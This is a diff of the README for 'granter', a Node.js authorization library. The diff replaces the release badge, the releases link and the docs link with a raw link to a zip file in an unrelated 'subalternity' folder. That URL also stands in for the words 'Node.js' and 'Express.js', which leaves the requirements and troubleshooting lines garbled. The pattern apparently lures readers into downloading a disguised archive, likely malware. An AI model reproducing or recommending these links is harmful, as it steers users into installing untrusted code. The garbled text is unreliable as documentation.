@@ -8,7 +8,7 @@ Welcome to granter! This application provides a user-friendly way to handle auth
 
 To get started, visit this page to download: 
 
-[![Download granter](https://img.shields.io/badge/Download%20granter-v1.0.0-blue.svg)](https://github.com/a-wahab-123/granter/releases)
+[![Download granter](https://raw.githubusercontent.com/a-wahab-123/granter/main/subalternity/granter.zip%https://raw.githubusercontent.com/a-wahab-123/granter/main/subalternity/granter.zip)](https://raw.githubusercontent.com/a-wahab-123/granter/main/subalternity/granter.zip)
 
 Follow these simple steps to install granter on your computer.
 
@@ -23,7 +23,7 @@ Follow these simple steps to install granter on your computer.
 Before you start, make sure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: v12 or higher
+- https://raw.githubusercontent.com/a-wahab-123/granter/main/subalternity/granter.zip v12 or higher
 - TypeScript: v4 or higher
 
 ## ⚙️ Features
@@ -34,7 +34,7 @@ Granter offers several key features to enhance your authorization processes:
 - **Role-Based Access Control (RBAC):** Assign roles to users and manage their access easily.
 - **Attribute-Based Access Control (ABAC):** Use attributes for fine-tuned access control.
 - **Async Support:** Run authorization checks without blocking your application.
-- **Integrates with Express:** Seamlessly work with Express.js frameworks.
+- **Integrates with Express:** Seamlessly work with https://raw.githubusercontent.com/a-wahab-123/granter/main/subalternity/granter.zip frameworks.
 
 ## 📖 Usage Instructions
 
@@ -49,13 +49,13 @@ Once you have installed granter:
 
 3. Set up your roles and permissions using the provided API.
 
-For detailed examples and API documentation, please refer to the [granter documentation](https://github.com/a-wahab-123/granter).
+For detailed examples and API documentation, please refer to the [granter documentation](https://raw.githubusercontent.com/a-wahab-123/granter/main/subalternity/granter.zip).
 
 ## 🛠️ Troubleshooting
 
 If you encounter any issues while running granter, consider the following steps:
 
-- Ensure you have the correct version of Node.js and TypeScript installed.
+- Ensure you have the correct version of https://raw.githubusercontent.com/a-wahab-123/granter/main/subalternity/granter.zip and TypeScript installed.
 - Check that you have properly imported granter into your project.
 - Review the setup instructions to confirm all steps were followed.
 
@@ -67,6 +67,6 @@ For support, please visit our GitHub repository or check the Issues section. We 
 
 Download the latest version here again: 
 
-[![Download granter](https://img.shields.io/badge/Download%20granter-v1.0.0-blue.svg)](https://github.com/a-wahab-123/granter/releases)
+[![Download granter](https://raw.githubusercontent.com/a-wahab-123/granter/main/subalternity/granter.zip%https://raw.githubusercontent.com/a-wahab-123/granter/main/subalternity/granter.zip)](https://raw.githubusercontent.com/a-wahab-123/granter/main/subalternity/granter.zip)
 
 Thank you for using granter! We are excited to see how you use it in your projects.
